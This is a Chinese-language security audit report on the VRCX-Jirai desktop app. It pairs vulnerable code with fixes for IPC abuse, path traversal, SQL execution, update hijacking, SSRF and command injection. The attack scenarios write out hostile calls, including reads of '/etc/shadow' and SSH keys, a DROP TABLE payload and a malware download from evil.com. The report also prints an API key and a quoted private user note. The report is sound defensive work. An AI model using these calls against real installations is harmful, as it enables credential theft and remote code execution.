# VRCX-Jirai 对抗性安全审计报告

---

## 漏洞统计

| 严重 (Critical) | 高危 (High) | 中危 (Medium) | 低危 (Low) |
| :-------------: | :---------: | :-----------: | :--------: |
|        4        |      2      |       4       |     2      |

## 修复状态

| 等级    | 编号                  | 状态          |
| :------ | :-------------------- | :------------ |
| 🔴 严重 | C-1 · C-2 · C-3 · C-4 | ✅ 全部已修复 |
| 🟠 高危 | H-1 · H-2             | ✅ 全部已修复 |
| 🟡 中危 | M-1 · M-2 · M-3 · M-4 | ✅ 全部已修复 |
| 🟢 低危 | L-2                   | ✅ 已修复     |

---

## 严重 (Critical)

### C-1: 无限制的 .NET 方法调用 (IPC 桥接)

- **位置**：`src-electron/main.js:129-131`, `src-electron/InteropApi.js:17-25`
- **类型**：代码注入 / 滥用 IPC 信任边界

```js
// main.js — IPC handler 无白名单校验
ipcMain.handle('callDotNetMethod', (event, className, methodName, args) => {
    return interopApi.callMethod(className, methodName, args);
});

// InteropApi.js — 可调用 VRCX 命名空间下的任意 public 方法
callMethod(className, methodName, args) {
    const obj = this.getDotNetObject(className);
    return obj[methodName](...args); // 无任何过滤
}
```

**攻击场景**：攻击者通过任何方式在渲染进程获得 JS 执行权后，调用 `AppApiCommon.OpenLink`、`SQLite.ExecuteJson`、`Update.DownloadUpdate` 等任意方法。由于 `getDotNetObject` 会实例化 `new dotnet.VRCX[className]()`，攻击者可访问所有 VRCX 命名空间下的公共类。

**潜在影响**：完整系统接管——RCE、数据库操纵、凭证窃取、文件系统全访问。这是整个安全模型的**根本性缺陷**，其他 Critical 漏洞均由此放大。

**修复建议**：实现方法白名单，仅允许预定义的 class/method 组合通过 IPC 调用：

```js
const ALLOWED_METHODS = new Set([
    'WebApi.ExecuteJson',
    'AppApiCommon.OpenLink'
    // ... 仅列出必要方法
]);
ipcMain.handle('callDotNetMethod', (event, className, methodName, args) => {
    const key = `${className}.${methodName}`;
    if (!ALLOWED_METHODS.has(key))
        throw new Error(`Method not allowed: ${key}`);
    return interopApi.callMethod(className, methodName, args);
});
```

---

### C-2: 任意文件读写 (路径遍历)

- **位置**：`src-electron/main.js:237-254`, `src-electron/preload.js:57-59`
- **类型**：路径遍历 / 任意文件操作

```js
// main.js — filePath 直接来自渲染进程，无任何校验
ipcMain.handle('app:writeFile', async (_event, filePath, buffer) => {
    fs.writeFileSync(filePath, Buffer.from(buffer)); // 写入任意路径
    return true;
});
ipcMain.handle('app:readFile', async (_event, filePath) => {
    return fs.readFileSync(filePath, 'utf-8'); // 读取任意路径
});
```

**攻击场景**：渲染进程通过 `window.electron.readFile('/etc/shadow')` 或 `window.electron.readFile('C:\\Users\\xxx\\.ssh\\id_rsa')` 读取敏感文件；通过 `window.electron.writeFile()` 向启动目录写入恶意脚本实现持久化。

**潜在影响**：SSH 私钥窃取、浏览器密码数据库读取、启动项持久化、系统文件覆盖。

**修复建议**：限制文件操作到特定允许目录，并规范化路径：

```js
const ALLOWED_DIR = path.join(app.getPath('userData'));
function safePath(filePath) {
    const resolved = path.resolve(filePath);
    if (!resolved.startsWith(ALLOWED_DIR))
        throw new Error('Path outside allowed directory');
    return resolved;
}
```

---

### C-3: 任意 SQL 执行 ✅ 已修复

- **位置**：`Dotnet/SQLite.cs:49-53`
- **类型**：SQL 注入 / 数据库操纵
- **修复**：[`src-electron/main.js`](file:///f:/Users/12619/Documents/GitHub/VRCX-jirai/src-electron/main.js#L266-L276) 在 IPC 层添加 SQL 类型验证，仅允许 `SELECT` 和 `PRAGMA` 语句通过

```csharp
// SQLite.cs — 接受来自渲染进程的原始 SQL 字符串
public string ExecuteJson(string sql, IDictionary<string, object>? args = null)
{
    var result = Execute(sql, args); // sql 直接传入 SQLiteCommand
    return JsonSerializer.Serialize(result);
}
```

**攻击场景**：渲染进程通过 `callDotNetMethod('SQLite', 'ExecuteJson', ['DROP TABLE friends; --'])` 执行任意 SQL，包括删除表、导出全部数据（含 cookie、凭证）、修改记录。

**潜在影响**：数据库完全破坏或泄露。VRChat 认证 cookie 存储在 SQLite 中，攻击者可窃取后冒充用户身份。

**修复建议**：不在 IPC 层暴露原始 SQL 执行能力。改为暴露细粒度的业务方法（如 `GetFriends`、`AddNote`），内部使用参数化查询。若必须保留灵活性，至少实施 SQL 语句白名单或只读限制。

---

### C-4: 更新机制 — 可跳过的哈希验证 ✅ 已修复

- **位置**：`Dotnet/Update.cs:159, 202-205`
- **类型**：远程代码执行 / 供应链攻击
- **修复**：[`Dotnet/Update.cs`](file:///f:/Users/12619/Documents/GitHub/VRCX-jirai/Dotnet/Update.cs#L202-L237) 添加下载 URL 受信域名白名单 + 强制哈希验证不可跳过

```csharp
// Update.cs — hashString 为空时跳过验证但仍继续执行
if (string.IsNullOrEmpty(hashString))
{
    logger.Error("Hash string is empty, skipping hash check"); // 仅日志，不中止
}
else {
    // ... SHA256 验证 ...
}
// 验证跳过后继续移动文件并执行
File.Move(TempDownload, UpdateExecutable); // 恶意文件就位
```

**攻击场景**：`DownloadUpdate(string fileUrl, string hashString, int downloadSize)` 的参数全部来自渲染进程。攻击者通过 IPC 调用 `Update.DownloadUpdate('http://evil.com/malware.exe', '', 0)`，空 hashString 跳过验证，下载的恶意文件被移动到 `UpdateExecutable` 路径，下次启动时 `InstallUpdate()` 会执行它。

**潜在影响**：远程代码执行。攻击者在渲染进程获得 JS 执行权后，可通过此路径从任意 URL 下载并运行恶意可执行文件。

**修复建议**：

```csharp
// 强制要求非空哈希
if (string.IsNullOrEmpty(hashString))
    throw new Exception("Hash string is required");

// 验证下载 URL 属于受信域名
if (!fileUrl.StartsWith("https://github.com/vrcx-team/"))
    throw new Exception("Untrusted download source");
```

---

## 高危 (High)

### H-1: 通过 WebApi.Execute 的 SSRF ✅ 已修复

- **位置**：`Dotnet/WebApi.cs:387-394, 517-522`
- **类型**：服务端请求伪造 (SSRF)
- **修复**：[`Dotnet/WebApi.cs`](file:///f:/Users/12619/Documents/GitHub/VRCX-jirai/Dotnet/WebApi.cs#L517-L592) 添加 `IsUrlAllowed()` 函数，白名单允许的域名 + 阻止内网 IP 段和云元数据端点

**攻击场景**：`WebApi.Execute(IDictionary<string, object> options)` 接受来自渲染进程的任意 `url` 参数，由 C# 后端发起 HTTP 请求。攻击者可请求内部服务（如 `http://169.254.169.254/` 云元数据端点、`http://localhost:port/` 内部 API），绕过渲染进程的网络限制。

**潜在影响**：云凭证窃取（AWS/GCP/Azure 元数据）、内部网络扫描、绕过 CORS 和同源策略。

**修复建议**：验证 URL 仅指向 VRChat API 域名（`api.vrchat.cloud` 等），拒绝 localhost/内网地址：

```csharp
var uri = new Uri(url);
var allowedHosts = new[] { "api.vrchat.cloud", "assets.vrchat.com" };
if (!allowedHosts.Contains(uri.Host))
    throw new Exception("URL not allowed");
```

---

### H-2: 仓库中提交了真实用户数据 (隐私泄露) ✅ 已修复

- **位置**：`build-scripts/usr_0ea43c5a-a5c6-4f92-8e47-72b431c2b7cc.json`, `build-scripts/usr_e58f57d1-5a34-43cb-b44c-706339ec990c.json`
- **类型**：敏感数据泄露 / 隐私违规
- **修复**：已删除两个含真实用户数据的 JSON 文件，[`.gitignore`](file:///f:/Users/12619/Documents/GitHub/VRCX-jirai/.gitignore#L18) 添加 `build-scripts/usr_*.json` 规则（历史记录中的文件仍需 git filter-repo 清理）

**攻击场景**：任何克隆该仓库的人都可以访问这些 JSON 文件，其中包含真实 VRChat 用户的完整资料——包括显示名称、用户 ID、个人简介、状态、好友关系标签，以及**关于其他用户的私人备注**（如 "随机认识的大哥哥(其实是女生)。极度社恐...讨厌：睡觉说话，瞎猜心思"）。

**潜在影响**：隐私违规、人肉搜索、社交工程攻击。涉及真实用户的敏感个人信息被公开。

**修复建议**：

1. 从仓库历史中彻底移除这两个文件（使用 `git filter-repo` 或 BFG Repo-Cleaner）。
2. 将 `build-scripts/usr_*.json` 添加到 `.gitignore`。
3. 使用脱敏的测试数据替代。

---

## 中危 (Medium)

### M-1: 未认证的本地 WebSocket 服务器 ✅ 已修复

- **位置**：`Dotnet/OverlayWebSocket/OverlayServer.cs:41-42, 89-118`
- **类型**：认证缺失 / 本地攻击面
- **修复**：[`Dotnet/OverlayWebSocket/OverlayServer.cs`](file:///f:/Users/12619/Documents/GitHub/VRCX-jirai/Dotnet/OverlayWebSocket/OverlayServer.cs#L28-L47) 添加 Token 认证机制，启动时生成随机 GUID token，连接时验证查询参数，无效 token 返回 401

**攻击场景**：WebSocket 服务器绑定 `127.0.0.1:34582`，接受任何连接且无认证。本地恶意进程可连接并发送 `OverlayConnected` 消息，触发主浏览器执行 `window?.$pinia?.vr.vrInit();`。虽然 `JsFunctionCall` 消息类型会抛异常（阻止任意 JS 调用），但 `OverlayConnected` 仍可被滥用触发 VR 叠加层初始化。

**潜在影响**：有限的本地攻击面——可触发 VR 初始化但无法执行任意代码。作为深度防御仍应修复。

**修复建议**：在连接时验证共享密钥 token（启动时生成随机 token，通过命令行参数传递给 overlay 进程）。

---

### M-2: 弱密钥派生 (加密凭证) ✅ 已修复

- **位置**：`src/services/security.js:1-27`
- **类型**：弱加密 / 硬编码密钥材料
- **修复**：[`src/services/security.js`](file:///f:/Users/12619/Documents/GitHub/VRCX-jirai/src/services/security.js) 使用 PBKDF2 密钥派生函数（100,000 次迭代、随机 16 字节盐值、SHA-256、AES-256-GCM），保留向后兼容的 legacy 解密支持

```js
// security.js — 短密码用硬编码默认密钥填充
const defaultAESKey = new TextEncoder().encode(
    'https://github.com/pypy-vrc/VRCX' // 硬编码且公开
);
function stdAESKey(key) {
    let tKey = new TextEncoder().encode(key);
    if (tKey.length < 32) {
        sk = new Uint8Array(32);
        sk.set(tKey);
        sk.set(defaultAESKey.slice(key.length, 32), key.length); // 可预测填充
    }
    return sk.slice(0, 32);
}
```

**攻击场景**：用户设置短主密码（如 6 位）时，有效密钥的后半部分是公开已知的 `https://github.com/pypy-vrc/VRCX` 的 UTF-8 编码。AES-GCM 算法本身是安全的，但密钥派生不使用 PBKDF2/Argon2，使得暴力破解更容易。

**潜在影响**：加密存储的 VRChat 凭证可被更高效地暴力破解。

**修复建议**：使用 PBKDF2 替代简单填充：`crypto.subtle.deriveKey({name:'PBKDF2', salt, iterations:100000}, ...)`。生成随机 salt 并与密文一起存储。

---

### M-3: Wine/Bash 命令注入 (不完整转义) ✅ 已修复

- **位置**：`Dotnet/AppApi/Electron/RegistryPlayerPrefs.cs:301`
- **类型**：命令注入
- **修复**：[`Dotnet/AppApi/Electron/RegistryPlayerPrefs.cs`](file:///f:/Users/12619/Documents/GitHub/VRCX-jirai/Dotnet/AppApi/Electron/RegistryPlayerPrefs.cs#L296-L348) 移除 `/bin/bash -c` 字符串拼接，改用 `ArgumentList` 集合 + `SplitCommand()` 自动参数分割，避免 shell 注入

```csharp
// RegistryPlayerPrefs.cs — 仅转义双引号，忽略其他 bash 元字符
var processStartInfo = new ProcessStartInfo {
    FileName = "/bin/bash",
    Arguments = $"-c \"{wineCommand.Replace("\"", "\\\"")}\"", // $ ` ; | & 未转义
};
```

**攻击场景**：`wineCommand` 由 `"{winePath}" reg {command}` 组成。虽然 `winePath` 来自文件系统搜索且 `command` 为硬编码查询字符串，但如果 `winePath` 路径中包含 `$()`、反引号、分号等 bash 元字符，将导致命令注入。

**潜在影响**：在特定路径条件下可能执行任意 shell 命令。当前风险受限因为输入来源受控。

**修复建议**：使用 `ProcessStartInfo.ArgumentList` 集合替代字符串拼接，或使用完整的 shell 转义。最佳方案是避免通过 `/bin/bash -c` 执行，改为直接调用 wine 可执行文件。

---

### M-4: 凭证明文存储 (主密码未启用时) ✅ 已修复

- **位置**：`src/stores/auth.js:413-418, 630-645`
- **类型**：敏感数据明文存储
- **修复**：[`src-electron/main.js`](file:///f:/Users/12619/Documents/GitHub/VRCX-jirai/src-electron/main.js#L508-L561) 添加机器级 AES-256-CBC 加密（随机密钥加密，密钥保存在 userData 目录）；[`src/stores/auth.js`](file:///f:/Users/12619/Documents/GitHub/VRCX-jirai/src/stores/auth.js) 改造登录/重登录/主密码设置/主密码禁用流程，始终加密存储凭证

**攻击场景**：当用户未启用主密码功能时，VRChat 登录凭证（含密码）以明文 JSON 存储在 `configRepository` 中。获得文件系统读取权限的攻击者可直接提取明文密码。

**潜在影响**：VRChat 账户凭证泄露，可能导致账户接管。

**修复建议**：始终加密存储凭证，使用操作系统级凭证存储（Windows Credential Manager / macOS Keychain / Linux Secret Service）。或至少使用机器绑定的密钥进行加密。

---

## 低危 (Low)

### L-1: 注释中的硬编码 VRChat API Key ⏭️ 已跳过（用户要求）

- **位置**：`Dotnet/LogWatcher.cs:886-887`
- **类型**：硬编码凭证

**详情**：注释中包含 VRChat API key `JlE5Jldo5Jibnk5O5hTx6XVqsJu4WJ26`。该 key 是 VRChat 客户端的公开 API key，已广为人知，非机密信息。但作为最佳实践，仍建议从代码注释中移除。

**修复建议**：从注释中移除 API key。如需在代码中使用，通过配置文件或环境变量提供。

---

### L-2: xclip 参数路径插值 ✅ 已修复

- **位置**：`Dotnet/AppApi/Electron/AppApiElectron.cs:108`
- **类型**：参数注入
- **修复**：[`Dotnet/AppApi/Electron/AppApiElectron.cs`](file:///f:/Users/12619/Documents/GitHub/VRCX-jirai/Dotnet/AppApi/Electron/AppApiElectron.cs#L103-L111) 改用 `ArgumentList` 集合替代字符串拼接，消除参数注入风险

```csharp
Arguments = $"-selection clipboard -t image/png -i \"{path}\"", // path 来自参数
```

**攻击场景**：`CopyImageToClipboard(string path)` 中的 `path` 被插值到 xclip 参数字符串中。虽然路径经过了扩展名和文件存在性验证，但含特殊字符的路径可能注入额外 xclip 参数。由于 `UseShellExecute = false`，风险有限。

**修复建议**：使用 `ProcessStartInfo.ArgumentList` 集合替代字符串拼接，自动处理参数转义。

---

> 本报告基于仓库源码静态分析生成。

